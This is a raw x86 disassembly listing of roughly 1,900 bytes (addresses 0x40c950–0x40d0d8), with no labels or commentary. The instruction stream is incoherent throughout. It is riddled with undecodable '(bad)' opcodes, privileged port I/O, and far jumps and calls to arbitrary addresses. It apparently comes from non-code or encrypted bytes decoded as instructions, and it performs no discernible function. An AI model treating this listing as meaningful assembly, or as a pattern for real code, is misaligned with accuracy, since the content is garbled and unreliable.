  40c950:	retf   0x30ba
  40c953:	mov    edx,0x848a7347
  40c958:	push   cs
  40c959:	ins    BYTE PTR es:[edi],dx
  40c95a:	push   ecx
  40c95b:	out    dx,eax
  40c95c:	sbb    edi,eax
  40c95e:	lds    ecx,FWORD PTR [eax-0x58]
  40c961:	inc    esp
  40c962:	mov    al,0x37
  40c964:	sbb    BYTE PTR [esi-0x12],al
  40c967:	aam    0x98
  40c969:	clc    
  40c96a:	cmp    esp,DWORD PTR [esi+edi*1-0x14499995]
  40c971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c972:	dec    esi
  40c973:	and    BYTE PTR [ebx-0x18],cl
  40c976:	mov    ecx,0xc76a20a3
  40c97b:	mov    eax,0xc278be51
  40c980:	pop    ds
  40c981:	mov    esp,0x5f2150d6
  40c986:	test   al,dl
  40c988:	or     DWORD PTR [eax-0x32],ecx
  40c98b:	xlat   BYTE PTR ds:[ebx]
  40c98c:	adc    al,cl
  40c98e:	cdq    
  40c98f:	adc    BYTE PTR [edi-0x30c363f],dl
  40c995:	pusha  
  40c996:	lea    edi,[esp+eiz*4+0x7]
  40c99a:	inc    ecx
  40c99b:	scas   al,BYTE PTR es:[edi]
  40c99c:	jmp    0x40c925
  40c99e:	xchg   edx,eax
  40c99f:	scas   eax,DWORD PTR es:[edi]
  40c9a0:	mov    ecx,0x9bb00cf4
  40c9a5:	sti    
  40c9a6:	sbb    al,0x48
  40c9a8:	frstor [ebx+0x4b]
  40c9ab:	mov    al,ds:0x392796e5
  40c9b0:	stc    
  40c9b1:	and    esi,DWORD PTR [edx-0x45]
  40c9b4:	sbb    eax,0xddf108c7
  40c9b9:	stc    
  40c9ba:	mov    edi,0x48f1c2d4
  40c9bf:	pop    esi
  40c9c0:	int3   
  40c9c1:	inc    ebx
  40c9c2:	add    ecx,DWORD PTR [eax-0x8d4b78b]
  40c9c8:	scas   eax,DWORD PTR es:[edi]
  40c9c9:	mov    ebx,0xab97ab18
  40c9ce:	xor    DWORD PTR [edi-0x31],ebp
  40c9d1:	outs   dx,BYTE PTR ds:[esi]
  40c9d2:	out    dx,eax
  40c9d3:	inc    esp
  40c9d4:	xor    eax,DWORD PTR [ecx]
  40c9d6:	imul   esp,DWORD PTR [esi],0xfad431f2
  40c9dc:	mov    edx,0x82d9d279
  40c9e1:	jno    0x40c9bf
  40c9e3:	or     BYTE PTR [esi-0x599fb312],dl
  40c9e9:	mov    ecx,0x20bb3dcd
  40c9ee:	sub    BYTE PTR [ebp*8+0x19ff99bf],ch
  40c9f5:	arpl   WORD PTR [edi-0x62],cx
  40c9f8:	mov    ds:0x5a7bbf8e,al
  40c9fd:	fldcw  WORD PTR [edx]
  40c9ff:	int    0x2c
  40ca01:	retf   
  40ca02:	push   eax
  40ca03:	inc    ecx
  40ca04:	data16 lahf 
  40ca06:	push   ds
  40ca07:	inc    ecx
  40ca08:	aam    0xb6
  40ca0a:	inc    ebp
  40ca0b:	nop
  40ca0c:	stos   DWORD PTR es:[edi],eax
  40ca0d:	jmp    0x9ae1:0xe4162f38
  40ca14:	mov    ebx,DWORD PTR [ecx-0x69]
  40ca17:	mov    al,0x31
  40ca19:	mov    ah,0xc
  40ca1b:	fild   WORD PTR [eax]
  40ca1d:	push   es
  40ca1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1f:	cmp    DWORD PTR [eax],esi
  40ca21:	pop    ecx
  40ca22:	pusha  
  40ca23:	jbe    0x40c9ec
  40ca25:	js     0x40ca3c
  40ca27:	jnp    0x40c9c8
  40ca29:	(bad)
  40ca2c:	inc    ebp
  40ca2d:	xlat   BYTE PTR ds:[ebx]
  40ca2e:	xchg   esp,eax
  40ca2f:	mov    ecx,0xcce65bc5
  40ca34:	cmp    BYTE PTR [edi-0x178ce9a8],dh
  40ca3a:	icebp  
  40ca3b:	sub    esi,0x324af7de
  40ca41:	cmp    DWORD PTR [ebp-0x4b],0x26fa8d10
  40ca48:	fnstenv [edi+0x6bc042df]
  40ca4e:	ins    BYTE PTR es:[edi],dx
  40ca4f:	and    ah,BYTE PTR [esi+ebp*4+0x72de95a7]
  40ca56:	adc    eax,0xe5ca1a44
  40ca5b:	xchg   edi,eax
  40ca5c:	fsubr  DWORD PTR [ecx-0x26f92938]
  40ca62:	cs aad 0x3c
  40ca65:	add    esi,DWORD PTR [esi-0x7e8e7d76]
  40ca6b:	stos   BYTE PTR es:[edi],al
  40ca6c:	mov    ecx,0x44ca6057
  40ca71:	rcl    ch,1
  40ca73:	iret   
  40ca74:	iret   
  40ca75:	jo     0x40ca2f
  40ca77:	in     al,dx
  40ca78:	adc    ah,BYTE PTR [ecx-0x8]
  40ca7b:	sub    DWORD PTR [ecx],ebx
  40ca7d:	dec    ebp
  40ca7e:	sahf   
  40ca7f:	mov    ch,0xf5
  40ca81:	cmp    DWORD PTR [eax],ebp
  40ca83:	mov    DWORD PTR [ecx-0x1f4b32e3],esp
  40ca89:	shr    bh,1
  40ca8b:	(bad)  
  40ca8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca8d:	mov    DWORD PTR [eax+0x490a111d],esi
  40ca93:	mov    ds:0x6ff6de66,eax
  40ca98:	(bad)  
  40ca99:	sub    eax,0xc302d566
  40ca9e:	mov    DWORD PTR [ecx-0x80],ecx
  40caa1:	xchg   DWORD PTR [ebx+0x3],eax
  40caa4:	je     0x40ca37
  40caa6:	dec    ebx
  40caa7:	jmp    0x2748:0xcb55f2ec
  40caae:	jecxz  0x40cad1
  40cab0:	adc    DWORD PTR [ecx+0x6bff099c],ecx
  40cab6:	and    DWORD PTR [edx+eax*8],ecx
  40cab9:	shr    DWORD PTR [edx],cl
  40cabb:	cmp    al,0x2c
  40cabd:	retf   0x1764
  40cac0:	into   
  40cac1:	shr    bh,cl
  40cac3:	mov    edi,0x6507d5eb
  40cac8:	mov    bh,0x9c
  40caca:	dec    ebp
  40cacb:	inc    edi
  40cacc:	push   ebx
  40cacd:	leave  
  40cace:	pop    esi
  40cacf:	jg     0x40cb4a
  40cad1:	sbb    DWORD PTR [edx+0x11d465fd],edi
  40cad7:	dec    ebp
  40cad8:	adc    eax,0xa79f4720
  40cadd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cade:	sub    BYTE PTR [esi+0x5b0a01b0],ah
  40cae4:	mov    edi,ebx
  40cae6:	mov    edx,0xf5e90888
  40caeb:	test   DWORD PTR [ebp+0x21],esp
  40caee:	xchg   esi,eax
  40caef:	and    al,0xc8
  40caf1:	cli    
  40caf2:	test   ch,dl
  40caf4:	call   DWORD PTR [ecx+0x36b59ae]
  40cafa:	scas   al,BYTE PTR es:[edi]
  40cafb:	stc    
  40cafc:	(bad)  
  40cafe:	call   0x4d1e:0xc50d2f2b
  40cb05:	mov    cl,0xed
  40cb07:	sbb    BYTE PTR [edx],al
  40cb09:	aad    0xfe
  40cb0b:	sbb    ebx,DWORD PTR [ebp-0x20229931]
  40cb11:	cmp    BYTE PTR [ebx-0x6],bh
  40cb14:	and    BYTE PTR [ebx+0x6a1e99d8],ch
  40cb1a:	cdq    
  40cb1b:	hlt    
  40cb1c:	jecxz  0x40cab2
  40cb1e:	aaa    
  40cb1f:	or     eax,0x77173d76
  40cb24:	or     bl,BYTE PTR [edx]
  40cb26:	mov    esp,0x64da864b
  40cb2b:	mov    ecx,0xbd3ef829
  40cb30:	nop
  40cb31:	sti    
  40cb32:	loop   0x40cae5
  40cb34:	aad    0x23
  40cb36:	mov    al,ds:0xc9c11e77
  40cb3b:	cmp    eax,0x64247c48
  40cb40:	jbe    0x40cb8a
  40cb42:	scas   al,BYTE PTR es:[edi]
  40cb43:	imul   edx,DWORD PTR [esi],0x28
  40cb46:	rcr    ecx,1
  40cb48:	or     edi,DWORD PTR [esp+eax*1+0x4d5f0ed7]
  40cb4f:	imul   ebx,edi,0xc977ffa0
  40cb55:	xchg   edx,eax
  40cb56:	mov    WORD PTR [esi-0x31a748e4],ds
  40cb5c:	jb     0x40cb93
  40cb5e:	push   ecx
  40cb5f:	arpl   WORD PTR [ebx-0x7ab0ad40],dx
  40cb65:	test   eax,0xd13b02d1
  40cb6a:	retf   
  40cb6b:	popa   
  40cb6c:	dec    edi
  40cb6d:	mov    ah,0x20
  40cb6f:	in     eax,dx
  40cb70:	retf   0x4e1c
  40cb73:	leave  
  40cb74:	adc    eax,0x2b844e04
  40cb79:	lahf   
  40cb7a:	xchg   edx,eax
  40cb7b:	cwde   
  40cb7c:	pop    edi
  40cb7d:	into   
  40cb7e:	rol    DWORD PTR [ecx-0x60],0x8
  40cb82:	add    al,0x23
  40cb84:	push   ecx
  40cb85:	mov    ah,0xc9
  40cb87:	jle    0x40cbe1
  40cb89:	cmp    al,0x9a
  40cb8b:	(bad)  
  40cb8c:	ficom  WORD PTR [bx+di]
  40cb8f:	mov    dl,0xd
  40cb91:	and    eax,DWORD PTR [edx]
  40cb93:	jnp    0x40cb8b
  40cb95:	sbb    ah,0x45
  40cb98:	xchg   esi,eax
  40cb99:	aas    
  40cb9a:	adc    al,BYTE PTR [ebp+0x2e28ba99]
  40cba0:	pop    ebx
  40cba1:	int    0x7
  40cba3:	mov    cl,0x1c
  40cba5:	cwde   
  40cba6:	ret    
  40cba7:	call   0xea7c78d2
  40cbac:	clc    
  40cbad:	xchg   edi,eax
  40cbae:	mov    cl,0xc4
  40cbb0:	add    BYTE PTR [edi+0x7f],al
  40cbb3:	xor    edx,esp
  40cbb5:	mov    ah,0x1
  40cbb7:	xor    al,0xb
  40cbb9:	retf   0xb7d5
  40cbbc:	add    edx,0x56
  40cbbf:	xchg   edx,eax
  40cbc0:	adc    eax,0xbeb251cf
  40cbc5:	test   DWORD PTR [edx+0x48],edx
  40cbc8:	xchg   ecx,eax
  40cbc9:	pop    ss
  40cbca:	into   
  40cbcb:	dec    esi
  40cbcc:	pop    esi
  40cbcd:	adc    DWORD PTR [eax+0x19323fb8],ebp
  40cbd3:	jmp    0x40cb6b
  40cbd5:	ror    BYTE PTR [ebx-0x5b71f177],1
  40cbdb:	and    ch,cl
  40cbdd:	popf   
  40cbde:	out    0xcf,al
  40cbe0:	add    DWORD PTR [ebx+eiz*1+0x7e],eax
  40cbe4:	pusha  
  40cbe5:	fnstcw WORD PTR ds:0x3ea17696
  40cbeb:	mov    bl,BYTE PTR [ebx-0x50]
  40cbee:	or     esi,DWORD PTR ds:0x635bd891
  40cbf4:	push   0xffffff80
  40cbf6:	sub    DWORD PTR [ecx-0x77],edx
  40cbf9:	jns    0x40cbe3
  40cbfb:	xchg   ebx,eax
  40cbfc:	or     BYTE PTR [ecx+0x2b009918],0x76
  40cc03:	push   0x246f5f1d
  40cc08:	test   al,0x1d
  40cc0a:	sbb    BYTE PTR [eax+0x5fd641f3],ch
  40cc10:	ja     0x40cbea
  40cc12:	xchg   esi,eax
  40cc13:	inc    esp
  40cc14:	lods   eax,DWORD PTR ds:[esi]
  40cc15:	jns    0x40cc4f
  40cc17:	sub    DWORD PTR [edi-0x574ab7b4],esp
  40cc1d:	mov    bl,0x88
  40cc1f:	ficomp DWORD PTR [esp+ebx*4-0x40ebdf39]
  40cc26:	nop
  40cc27:	inc    eax
  40cc28:	retf   
  40cc29:	retf   0x7d27
  40cc2c:	hlt    
  40cc2d:	fs mov ebx,0x2578110f
  40cc33:	repnz add al,0xe5
  40cc36:	ret    0xaa54
  40cc39:	sub    esp,ebx
  40cc3b:	addr16 pop edx
  40cc3d:	outs   dx,BYTE PTR ds:[esi]
  40cc3e:	mov    dl,0xfe
  40cc40:	dec    ecx
  40cc41:	cmp    al,0x2
  40cc43:	int3   
  40cc44:	mov    eax,0x946a9e98
  40cc49:	cli    
  40cc4a:	repnz push ss
  40cc4c:	pop    edx
  40cc4d:	lahf   
  40cc4e:	vmwrite ebx,DWORD PTR [ecx+0x4031342f]
  40cc55:	test   ebx,esp
  40cc57:	mov    eax,0x288e92f
  40cc5c:	add    cl,0x59
  40cc5f:	cld    
  40cc60:	lods   eax,DWORD PTR ds:[esi]
  40cc61:	cmp    dh,BYTE PTR [ebx+ebx*8-0x4d]
  40cc65:	push   ss
  40cc66:	outs   dx,DWORD PTR ds:[esi]
  40cc67:	jnp    0x40cc74
  40cc69:	call   0x9add:0x131188e1
  40cc70:	and    eax,0x3a6e620c
  40cc75:	in     eax,0x32
  40cc77:	sub    eax,0xf0b2a0c2
  40cc7c:	mul    DWORD PTR [eax-0x6d]
  40cc7f:	test   DWORD PTR [esi+0x4d41aac6],eax
  40cc85:	es mov esp,0xde6adb16
  40cc8b:	pop    edx
  40cc8c:	push   0x59
  40cc8e:	sub    eax,0x6466758e
  40cc93:	pusha  
  40cc94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc95:	jne    0x40cc40
  40cc97:	and    al,0x18
  40cc99:	or     esi,ebx
  40cc9b:	adc    BYTE PTR [ebx+0x6a80faec],bh
  40cca1:	call   0x5fa6:0x36029d6e
  40cca8:	inc    ecx
  40cca9:	outs   dx,BYTE PTR ds:[esi]
  40ccaa:	fcom   QWORD PTR [esi+0xa411686]
  40ccb0:	dec    eax
  40ccb1:	inc    edx
  40ccb2:	adc    al,0x72
  40ccb4:	arpl   bx,ax
  40ccb6:	inc    ebx
  40ccb7:	and    cl,BYTE PTR [eax+0x35]
  40ccba:	stos   DWORD PTR es:[edi],eax
  40ccbb:	stc    
  40ccbc:	cmp    eax,0x27239565
  40ccc1:	xchg   ebx,eax
  40ccc2:	call   0x5615bc69
  40ccc7:	xchg   ecx,eax
  40ccc8:	inc    DWORD PTR [esi-0x57780c52]
  40ccce:	pushf  
  40cccf:	leave  
  40ccd0:	outs   dx,DWORD PTR ds:[esi]
  40ccd1:	inc    esi
  40ccd2:	cmp    edx,esi
  40ccd4:	inc    ebp
  40ccd5:	push   ds
  40ccd6:	es (bad) 
  40ccd8:	dec    edx
  40ccd9:	xchg   esi,eax
  40ccda:	cs test dh,0xbb
  40ccde:	xor    BYTE PTR [eax-0xee1bc13],dl
  40cce4:	cmp    BYTE PTR [ebp+0x5efb431],dl
  40ccea:	cmp    esp,DWORD PTR [ebx-0x80]
  40cced:	jecxz  0x40cd01
  40ccef:	stos   BYTE PTR es:[edi],al
  40ccf0:	xor    al,0xe0
  40ccf2:	test   eax,0x48232055
  40ccf7:	popa   
  40ccf8:	fistp  WORD PTR [esp+ebx*1]
  40ccfb:	out    dx,al
  40ccfc:	sbb    ebp,DWORD PTR [ebx+edi*8]
  40ccff:	popa   
  40cd00:	cmp    bl,BYTE PTR [ebx]
  40cd02:	and    BYTE PTR [ecx],al
  40cd04:	and    cl,BYTE PTR [edx-0x5165c374]
  40cd0a:	fld    DWORD PTR [edi+0x501197ce]
  40cd10:	stc    
  40cd11:	adc    ebp,DWORD PTR [ebx-0x229bb6c]
  40cd17:	dec    ebp
  40cd18:	xor    BYTE PTR [ebp+0x76],dh
  40cd1b:	cmp    DWORD PTR [eax-0x29],esp
  40cd1e:	jmp    0x40cd24
  40cd20:	iret   
  40cd21:	pop    ebp
  40cd22:	call   0x2301:0x4eb5255b
  40cd29:	mov    dh,0xeb
  40cd2b:	dec    BYTE PTR [edi]
  40cd2d:	clc    
  40cd2e:	out    dx,eax
  40cd2f:	xor    DWORD PTR [edi-0x583b1eee],edi
  40cd35:	loope  0x40cd43
  40cd37:	pop    eax
  40cd38:	xor    BYTE PTR [edi-0x4f],bh
  40cd3b:	inc    esp
  40cd3c:	js     0x40cceb
  40cd3e:	dec    ebx
  40cd3f:	es clc 
  40cd41:	push   edx
  40cd42:	push   eax
  40cd43:	xchg   ebp,eax
  40cd44:	stos   DWORD PTR es:[edi],eax
  40cd45:	xor    BYTE PTR [ecx+0x764e6837],bh
  40cd4b:	sbb    ah,BYTE PTR [esi+0x39]
  40cd4e:	test   eax,0x919da380
  40cd53:	loope  0x40cd70
  40cd55:	cli    
  40cd56:	scas   al,BYTE PTR es:[edi]
  40cd57:	das    
  40cd58:	imul   esp,DWORD PTR [ecx],0x10b07315
  40cd5e:	adc    ah,al
  40cd60:	or     cl,BYTE PTR [ebx+edx*1]
  40cd63:	xor    ebx,DWORD PTR [eax-0x1a6b06be]
  40cd69:	and    eax,DWORD PTR [esi]
  40cd6b:	gs int 0x77
  40cd6e:	retf   0x3cce
  40cd71:	jge    0x40cd78
  40cd73:	imul   BYTE PTR [ebx+0x6d00906f]
  40cd79:	lock and al,0x4c
  40cd7c:	dec    ecx
  40cd7d:	push   ecx
  40cd7e:	ins    BYTE PTR es:[edi],dx
  40cd7f:	cmp    al,BYTE PTR [edx]
  40cd81:	mov    ds:0x82371b97,al
  40cd86:	mov    al,ds:0x3b0b1e11
  40cd8b:	mov    bl,0x8c
  40cd8d:	or     ebx,DWORD PTR [ebp+0x5a]
  40cd90:	mov    ecx,0x6e88aa87
  40cd95:	jns    0x40cd70
  40cd97:	pop    esi
  40cd98:	inc    esp
  40cd99:	inc    esp
  40cd9a:	ins    BYTE PTR es:[edi],dx
  40cd9b:	and    eax,0x676e4578
  40cda0:	pop    ds
  40cda1:	mov    ah,0x2
  40cda3:	jmp    0xb385:0x45a9eb84
  40cdaa:	dec    ebp
  40cdab:	mov    eax,0xf672540d
  40cdb0:	add    ebp,DWORD PTR [ebx-0x6]
  40cdb3:	pop    edi
  40cdb4:	mov    eax,ds:0x63523ecc
  40cdb9:	push   esi
  40cdba:	pop    eax
  40cdbb:	cld    
  40cdbc:	ja     0x40cda4
  40cdbe:	fiadd  WORD PTR [edi]
  40cdc0:	fcomp  DWORD PTR [eax-0x73]
  40cdc3:	fsub   DWORD PTR [edx-0x36]
  40cdc6:	fwait
  40cdc7:	loopne 0x40cd4a
  40cdc9:	xor    BYTE PTR [ebp-0x2],0x25
  40cdcd:	xchg   edx,eax
  40cdce:	call   0x26fd:0x6b2a9739
  40cdd5:	dec    esp
  40cdd6:	popf   
  40cdd7:	mov    BYTE PTR [edi+0x75],cl
  40cdda:	sti    
  40cddb:	comiss xmm3,xmm0
  40cdde:	xchg   edx,eax
  40cddf:	push   esi
  40cde0:	sub    eax,0x466bc492
  40cde5:	pop    esp
  40cde6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cde7:	in     al,0x2f
  40cde9:	dec    esi
  40cdea:	pushf  
  40cdeb:	mov    esi,0x79da456
  40cdf0:	ret    
  40cdf1:	and    eax,0x6859b216
  40cdf6:	fistp  WORD PTR ds:0x8ed2b1d5
  40cdfc:	mov    ds:0x185112d2,eax
  40ce01:	and    al,0x4b
  40ce03:	int    0x5
  40ce05:	and    eax,0x1d3031fa
  40ce0a:	fstp   TBYTE PTR [ecx*4-0x702b284c]
  40ce11:	add    BYTE PTR [ecx-0x2711ea9],cl
  40ce17:	mov    cl,0xc3
  40ce19:	xchg   ebp,eax
  40ce1b:	jl     0x40ce4d
  40ce1d:	retf   
  40ce1e:	push   ecx
  40ce1f:	xor    eax,0x5cdeaeaa
  40ce24:	sub    eax,0x415aa959
  40ce29:	nop
  40ce2a:	out    0xc0,eax
  40ce2c:	add    BYTE PTR [ebp+0x66cb6537],0xbb
  40ce33:	mov    edx,0x56e11dc9
  40ce38:	sbb    esi,DWORD PTR [edx+0x18]
  40ce3b:	retf   0x7789
  40ce3e:	inc    ebx
  40ce3f:	add    edx,DWORD PTR [edi]
  40ce41:	addr16 sub eax,0x8681a7c2
  40ce47:	mov    dl,0xc1
  40ce49:	call   0xd1f13bbd
  40ce4e:	out    dx,eax
  40ce4f:	test   al,0x36
  40ce51:	mov    al,0x5b
  40ce53:	sbb    eax,0xf534d755
  40ce58:	xor    BYTE PTR [ebx],0x6c
  40ce5b:	out    dx,al
  40ce5c:	ja     0x40ce53
  40ce5e:	or     esp,0xffffff8f
  40ce61:	push   ebx
  40ce62:	mov    edx,cs
  40ce64:	pushf  
  40ce65:	lahf   
  40ce66:	clc    
  40ce67:	lods   al,BYTE PTR ds:[esi]
  40ce68:	jnp    0x40cdfb
  40ce6a:	les    edx,FWORD PTR [eax-0x5a]
  40ce6d:	push   esi
  40ce6e:	adc    esi,DWORD PTR fs:[edx-0x73f77e29]
  40ce75:	pop    edi
  40ce76:	je     0x40cea3
  40ce78:	push   0x73
  40ce7a:	jecxz  0x40cebd
  40ce7c:	lods   eax,DWORD PTR ds:[esi]
  40ce7d:	xor    esi,DWORD PTR [ecx+0x54f122ee]
  40ce83:	cmc    
  40ce84:	(bad)  
  40ce85:	and    al,0x9f
  40ce87:	and    DWORD PTR [esp+edi*1+0x0],ecx
  40ce8b:	pop    esp
  40ce8c:	or     BYTE PTR [esi-0x2d],bh
  40ce8f:	inc    esp
  40ce90:	ins    DWORD PTR es:[edi],dx
  40ce91:	nop
  40ce92:	pusha  
  40ce93:	inc    ebp
  40ce94:	inc    ebp
  40ce95:	mov    BYTE PTR [ecx+eiz*4-0x31],bl
  40ce99:	add    edx,DWORD PTR [edx+edx*4-0x3300408a]
  40cea0:	shl    BYTE PTR [eax],0xb4
  40cea3:	xchg   edx,eax
  40cea4:	hlt    
  40cea5:	out    dx,al
  40cea6:	jp     0x40ce86
  40cea8:	or     al,0x24
  40ceaa:	(bad)  
  40ceab:	jmp    0x40ce6c
  40cead:	stc    
  40ceae:	fild   QWORD PTR ds:0x8b03e649
  40ceb4:	jl     0x40cef7
  40ceb6:	sub    al,0xf
  40ceb8:	pop    edi
  40ceb9:	sub    BYTE PTR [ecx+0x1a53ac60],al
  40cebf:	push   cs
  40cec0:	in     eax,dx
  40cec1:	mov    bh,0xc4
  40cec3:	outs   dx,BYTE PTR ds:[esi]
  40cec4:	enter  0xf02e,0x53
  40cec8:	xlat   BYTE PTR ds:[ebx]
  40cec9:	push   edi
  40ceca:	inc    edx
  40cecb:	bound  ebx,QWORD PTR [ecx+0x16349071]
  40ced1:	push   eax
  40ced2:	in     al,0xc6
  40ced4:	pop    ds
  40ced5:	shr    DWORD PTR [edi+0x42c4af81],1
  40cedb:	icebp  
  40cedc:	arpl   dx,bp
  40cede:	dec    edi
  40cedf:	xor    ecx,edi
  40cee1:	jns    0x40ceda
  40cee3:	adc    esp,esi
  40cee5:	bound  ebp,QWORD PTR [ebx*8+0x4dc94c47]
  40ceec:	mov    dh,0xb6
  40ceee:	or     esi,DWORD PTR es:0x29582d07
  40cef5:	fst    DWORD PTR [edx-0x65]
  40cef8:	or     ecx,DWORD PTR [eax+0x63]
  40cefb:	push   ss
  40cefc:	les    esi,FWORD PTR [ecx]
  40cefe:	mov    esi,0x18c87313
  40cf03:	dec    DWORD PTR [eax]
  40cf05:	ins    DWORD PTR es:[edi],dx
  40cf06:	and    al,0xf9
  40cf08:	push   cs
  40cf09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf0a:	call   0xe5ec:0x1c07
  40cf10:	jb     0x40cecf
  40cf12:	and    eax,0xd7f8d45c
  40cf17:	stos   DWORD PTR es:[edi],eax
  40cf18:	jmp    0x63c9:0xb61896a2
  40cf1f:	fwait
  40cf20:	sub    ecx,DWORD PTR [ebp+0xbdb4d34]
  40cf26:	jl     0x40cf32
  40cf28:	jae    0x40cf2a
  40cf2a:	shl    DWORD PTR [esi-0x76],cl
  40cf2d:	jmp    0xd9acc4f4
  40cf32:	jns    0x40cf83
  40cf34:	mov    bl,0xfe
  40cf36:	cmp    dh,BYTE PTR [edi+eax*2]
  40cf39:	xor    dh,bl
  40cf3b:	add    bp,WORD PTR ss:[ecx-0x31]
  40cf40:	and    al,0xe9
  40cf42:	inc    ebx
  40cf43:	daa    
  40cf44:	pop    ds
  40cf45:	mov    BYTE PTR [edx-0x68],bh
  40cf48:	test   eax,0x72258a0
  40cf4d:	add    al,0x6d
  40cf4f:	retf   0x6101
  40cf52:	idiv   DWORD PTR [ebp+0x73]
  40cf55:	mov    ds:0x54d39785,al
  40cf5a:	mov    DWORD PTR [edi],ecx
  40cf5c:	arpl   di,ax
  40cf5e:	outs   dx,BYTE PTR ds:[esi]
  40cf5f:	xor    dl,ah
  40cf61:	lahf   
  40cf62:	test   al,0xe9
  40cf64:	dec    esp
  40cf65:	push   0xfdbe1945
  40cf6a:	adc    eax,0xf45ae23f
  40cf6f:	imul   ebx,ebp,0xe7e3d345
  40cf75:	and    al,0xd2
  40cf77:	lea    ebx,[edi+0x603e197f]
  40cf7d:	xchg   esp,eax
  40cf7e:	add    al,0x4
  40cf80:	push   es
  40cf81:	add    esp,esi
  40cf83:	jno    0x40cff6
  40cf85:	jmp    0x40cfc9
  40cf87:	or     ch,bl
  40cf89:	je     0x40cf56
  40cf8b:	stos   DWORD PTR es:[edi],eax
  40cf8c:	lea    edi,[ebp-0x48]
  40cf8f:	out    dx,al
  40cf90:	cmp    ecx,edx
  40cf92:	fs sti 
  40cf94:	dec    esp
  40cf95:	or     dh,BYTE PTR [eax+0x3bd07027]
  40cf9b:	pop    esi
  40cf9c:	inc    esp
  40cf9d:	(bad)  
  40cf9e:	pusha  
  40cf9f:	rol    BYTE PTR [eax],cl
  40cfa1:	push   edi
  40cfa2:	and    esp,DWORD PTR [esi]
  40cfa4:	jg     0x40cf7b
  40cfa6:	push   0x33
  40cfa8:	adc    bl,BYTE PTR [esi+0x42a18095]
  40cfae:	daa    
  40cfaf:	lahf   
  40cfb0:	rol    al,cl
  40cfb2:	(bad)  
  40cfb3:	lea    edx,[esi+0x1e]
  40cfb6:	push   ss
  40cfb7:	add    al,0xa4
  40cfb9:	push   0xf0a2c567
  40cfbe:	shl    DWORD PTR [edi-0x38b596cd],0xa1
  40cfc5:	inc    DWORD PTR [edi+edi*2]
  40cfc8:	xchg   BYTE PTR ds:0x825daf15,ah
  40cfce:	in     al,0xec
  40cfd0:	out    dx,eax
  40cfd1:	sbb    bh,BYTE PTR [edx-0x37]
  40cfd4:	enter  0x1065,0xf0
  40cfd8:	lahf   
  40cfd9:	jb     0x40d043
  40cfdb:	pop    eax
  40cfdc:	test   dh,dl
  40cfde:	ret    0xf5be
  40cfe1:	inc    ebp
  40cfe2:	(bad)  
  40cfe3:	out    dx,eax
  40cfe4:	repnz xchg ebp,edx
  40cfe7:	imul   ebx,DWORD PTR [esi+0x5f5ce09],0x1565dd29
  40cff1:	push   ss
  40cff2:	icebp  
  40cff3:	add    DWORD PTR [eax-0x3],ebp
  40cff6:	bound  edx,QWORD PTR [ecx-0x75]
  40cff9:	mov    DWORD PTR [ebx],esp
  40cffb:	sti    
  40cffc:	popa   
  40cffd:	ret    
  40cffe:	mov    al,ds:0x63a4545a
  40d003:	push   ds
  40d004:	aaa    
  40d005:	xlat   BYTE PTR ds:[ebx]
  40d006:	sbb    eax,0x2f91dd
  40d00b:	add    DWORD PTR [edx-0xc],0x8efb5937
  40d012:	pop    edx
  40d013:	jmp    0x40d045
  40d015:	adc    edx,DWORD PTR [edi+eiz*4+0x415339be]
  40d01c:	in     al,0x5b
  40d01e:	sar    ecx,cl
  40d020:	push   0xfffffff3
  40d022:	add    DWORD PTR [edi],0xffffffef
  40d025:	or     eax,0x3ab4994e
  40d02a:	call   0xb064:0x1d8e5ad3
  40d031:	mov    ebp,0x25c262b
  40d036:	xchg   edx,eax
  40d037:	ror    esi,1
  40d039:	jecxz  0x40cfe6
  40d03b:	xchg   esi,eax
  40d03c:	pop    ds
  40d03d:	in     eax,0x52
  40d03f:	retf   
  40d040:	pop    ds
  40d041:	xchg   esp,eax
  40d042:	adc    cl,BYTE PTR [eax]
  40d044:	(bad)  
  40d045:	pop    edx
  40d046:	sbb    ecx,ecx
  40d048:	and    DWORD PTR [ebx+0x1e],0x82ae5468
  40d04f:	ret    0x88ba
  40d052:	push   es
  40d053:	daa    
  40d054:	adc    DWORD PTR [edi],eax
  40d056:	cmp    BYTE PTR [esi],ah
  40d058:	and    al,0xea
  40d05b:	aaa    
  40d05c:	cmp    ebx,esi
  40d05e:	(bad)  
  40d061:	dec    esp
  40d062:	arpl   WORD PTR [ebp+0x7abec54],di
  40d068:	imul   esp,DWORD PTR [edx-0xa],0x76
  40d06c:	and    edi,DWORD PTR [esi]
  40d06e:	icebp  
  40d06f:	in     eax,0x54
  40d071:	lahf   
  40d072:	jmp    0x6f2f9f07
  40d077:	ret    0x5ec4
  40d07a:	jle    0x40d077
  40d07c:	push   ecx
  40d07d:	adc    eax,0xd880d286
  40d082:	push   ss
  40d083:	add    DWORD PTR [esi-0x7f0879fb],esi
  40d089:	dec    edi
  40d08a:	adc    edx,DWORD PTR [ebx-0x12]
  40d08d:	cmp    al,0x66
  40d08f:	fld    TBYTE PTR [eax]
  40d091:	fsubrp st(1),st
  40d093:	arpl   dx,si
  40d095:	retf   0x7f0b
  40d098:	sbb    BYTE PTR [ebx],bl
  40d09a:	pop    esi
  40d09b:	jae    0x40d0ee
  40d09d:	xor    al,0x4b
  40d09f:	js     0x40d091
  40d0a1:	nop
  40d0a2:	mov    ds:0x20a35ef3,al
  40d0a7:	ror    DWORD PTR [eax-0x70],0xe4
  40d0ab:	(bad)  
  40d0ac:	outs   dx,BYTE PTR ds:[esi]
  40d0ad:	sbb    BYTE PTR [edi-0x2f],bh
  40d0b0:	push   ecx
  40d0b1:	aam    0xbc
  40d0b3:	push   0x27
  40d0b5:	pop    es
  40d0b6:	adc    DWORD PTR [esi],esi
  40d0b8:	pop    ebp
  40d0b9:	out    0xe4,al
  40d0bb:	add    eax,0xfc13cf77
  40d0c0:	repnz fmul DWORD PTR [ecx]
  40d0c3:	out    dx,al
  40d0c4:	mov    edi,0xf53cb880
  40d0c9:	add    DWORD PTR [ebp+0x2a],0xb717fe57
  40d0d0:	mov    DWORD PTR [eax+ebx*1],esp
  40d0d3:	es in  al,0xb9
  40d0d6:	outs   dx,BYTE PTR ds:[esi]
  40d0d7:	ret    
  40d0d8:	pop    ds
